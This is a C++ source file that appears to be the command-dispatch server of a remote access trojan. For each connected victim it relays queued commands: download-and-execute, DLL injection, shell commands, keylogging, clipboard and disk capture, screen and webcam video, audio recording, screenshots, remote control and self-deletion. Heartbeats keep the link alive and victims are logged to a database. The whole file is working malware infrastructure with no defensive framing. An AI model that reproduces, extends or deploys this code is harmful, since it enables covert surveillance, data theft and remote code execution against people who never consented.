
#include <Windows.h>
#include "main.h"
#include "Public.h"
#include "CommandRecver.h"
#include "onlinemanager.h"
#include "Commander.h"

#include "stdio.h"
#include "Shlwapi.h"

#include <Dbghelp.h>

#include "UploadFile.h"
#include "DownloadFile.h"
#include "CommandRecver.h"

#include "mysqlOper.h"
#include "FileReadLine.h"

#pragma comment( lib, "Shlwapi.lib")
#pragma comment(lib,"dbghelp.lib")


int CommandRecver::SendHeartBeat(LPUNIQUECLIENTSYMBOL lpUnique, NETWORKPROCPARAM stParam, char* lpdata, int datasize) {

	LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)lpdata;
	lphdr->cmd = HEARTBEAT;
	lphdr->unique = *lpUnique;
	lphdr->packlen = 0;
	int iLen = sizeof(NETWORKPACKETHEADER);

	int iRet = send(stParam.hSockClient, lpdata, iLen, 0);
	if (iRet <= 0)
	{
		return FALSE;
	}

	iRet = recv(stParam.hSockClient, lpdata, datasize, 0);
	if (iRet <= 0)
	{
		return FALSE;
	}

	LPNETWORKPACKETHEADER lpnewhdr = (LPNETWORKPACKETHEADER)lpdata;
	if (lpnewhdr->cmd != HEARTBEAT ||
		memcmp(lpnewhdr->unique.cMAC, lpUnique->cMAC, MAC_ADDRESS_LENGTH) ||
		lpnewhdr->unique.dwVolumeNO != lpUnique->dwVolumeNO)
	{
		return FALSE;
	}
	return TRUE;
}




int __stdcall CommandRecver::CommandRecverProcess(LPNETWORKPROCPARAM lpParam, char* lpdata)
{
	NETWORKPROCPARAM stParam = *lpParam;

	char szClientInfo[MAX_PATH];
	char szShowInfo[1024];

	int iRet = 0;

	int dwPackSize = recv(stParam.hSockClient, lpdata, NETWORK_BUF_SIZE, 0);
	if (dwPackSize < sizeof(NETWORKPACKETHEADER))
	{
		InetAddrFormatString(stParam, szClientInfo);
		iRet = GetLastError();
		wsprintfA(szShowInfo, "CommandProc recv packet header error code:%u client:%s\r\n", iRet, szClientInfo);
		WriteLog(szShowInfo);
		return FALSE;
	}

	NETWORKPACKETHEADER hdr = *(LPNETWORKPACKETHEADER)lpdata;
	int dwCommand = hdr.cmd;
	UNIQUECLIENTSYMBOL Unique = hdr.unique;
	if (dwCommand != HEARTBEAT || (hdr.packlen != dwPackSize - sizeof(NETWORKPACKETHEADER)))
	{
		char szIP[MAX_PATH];
		unsigned char* pIP = (unsigned char*)&lpParam->stAddrClient.sin_addr.S_un;
		wsprintfA(szIP, "%u.%u.%u.%u", *pIP, *(pIP + 1), *(pIP + 2), *(pIP + 3));
		wsprintfA(szShowInfo, "CommandProc unrecognized command packet,MAC:%02X_%02X_%02X_%02X_%02X_%02X,IP:%s,PORT:%u\r\n"
			, Unique.cMAC[0], Unique.cMAC[1], Unique.cMAC[2], Unique.cMAC[3], Unique.cMAC[4], Unique.cMAC[5], szIP,
			ntohs(lpParam->stAddrClient.sin_port));
		WriteLog(szShowInfo);

		return FALSE;
	}

	char szuser[MAX_USERNAME_SIZE * 2] = { 0 };
	memcpy(szuser, Unique.username, MAX_USERNAME_SIZE);

	iRet = OnlineManager::CheckIfOnlineExist(&Unique, stParam.hSockClient, stParam.stAddrClient, lpdata, COMMAND_THREAD, stParam.dwThreadID);

	int waitcnt = 0;
	int waitceiling = HEARTBEAT_LOOP_DELAY / COMMAND_LOOP_DELAY;

	while (TRUE)
	{
		__try {

			iRet = UploadFiles::UploadFile(UPLOADFILE, UPLOADFILECOMMANDFILE, &Unique, stParam, lpdata, NETWORK_BUF_SIZE);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}
			iRet = DownloadFiles::DownloadFile(DOWNLOADFILE, DOWNLOADFILECOMMANDFILE, &Unique, stParam, lpdata, NETWORK_BUF_SIZE);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}

			iRet = DownloadFiles::DownloadFile(DOWNLOADRUNEXE, DOWNLOADRUNEXECOMMANDFILE, &Unique, stParam, lpdata, NETWORK_BUF_SIZE);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}

			iRet = DownloadFiles::DownloadFile(INJECTDLL, INJECTDLLCOMMANDFILE, &Unique, stParam, lpdata, NETWORK_BUF_SIZE);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}
			iRet = Commander::CommandWith2String(MESSAGEBOX, MESSAGEBOXCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}


			iRet = Commander::CommandWithString(SHELLCOMMAND, SHELLCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}
			iRet = Commander::CommandWithString(SCREENVIDEO, SCREENVIDEOCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}
			iRet = Commander::CommandWithString(CAMERAVIDEO, CAMERAVIDEOCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}
			iRet = Commander::CommandWithString(SOUNDRECORD, SOUNDRECORDCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}

			iRet = Commander::CommandWithoutParam(SUICIDE, SUICIDECOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}
			iRet = Commander::CommandWithoutParam(CAMERAPHOTO, CAMERAPHOTOCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}
			iRet = Commander::CommandWithoutParam(CLIPBOARDRECORD, CLIPBOARDCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}
			iRet = Commander::CommandWithoutParam(KEYBOARDRECORD, KEYBOARDCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}
			iRet = Commander::CommandWithoutParam(DISKFILERECORD, DISKRECORDCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}
			iRet = Commander::CommandWithoutParam(REMOTECONTROL, REMOTECONTROLCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}

			iRet = Commander::CommandWithoutParam(HARDDISKALLFILE, HDALLFILESCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}

			iRet = Commander::CommandWithoutParam(SYSTEMINFO, SYSTEMINFOCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}

			iRet = Commander::CommandWithoutParam(RUNNING_APPS, RUNNINGAPPSCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}

			iRet = Commander::CommandWithoutParam(INSTALLED_APPS, INSTALLAPPSCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}

			iRet = Commander::CommandWithoutParam(SCREENSNAPSHOT, SCRNSNAPSHOTCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}

			iRet = Commander::CommandWithoutParam(APPSCREENSNAPSHOT, APPSCRNSHOTCOMMANDFILE, &Unique, stParam);
			if (iRet == NETWORK_ERROR_CODE)
			{
				break;
			}


			Sleep(COMMAND_LOOP_DELAY);

			waitcnt++;
			if (waitcnt >= waitceiling)
			{
				waitcnt = 0;
				iRet = SendHeartBeat(&Unique, stParam, lpdata, NETWORK_BUF_SIZE);
				if (iRet == FALSE)
				{
					break;
				}
				else {
					iRet =
						OnlineManager::CheckIfOnlineExist(&Unique, stParam.hSockClient, stParam.stAddrClient,
							lpdata, COMMAND_THREAD, stParam.dwThreadID);
#ifdef USE_MYSQL
					MySql::enterLock();
					MySql* mysql = new MySql();
					string mac = FileReadLine::getmac(Unique.cMAC);
					mysql->insertClientFromCmd(szuser, mac);
					delete mysql;
					MySql::leaveLock();
#endif
				}
			}
		}
		__except (1) {
			WriteLog("CommandRecverProcess exception\r\n");
			break;
		}

	}

	return FALSE;
}



int __stdcall CommandRecver::CommandRecverProc(LPNETWORKPROCPARAM lpParam) {

	int iRet = 0;

	char lpdata[NETWORK_BUF_SIZE + 1024];

	__try {
		iRet = CommandRecverProcess(lpParam, lpdata);
	}
	__except (1) {
		WriteLog("CommandRecverProc exception\r\n");
	}

	closesocket(lpParam->hSockClient);

	return iRet;
}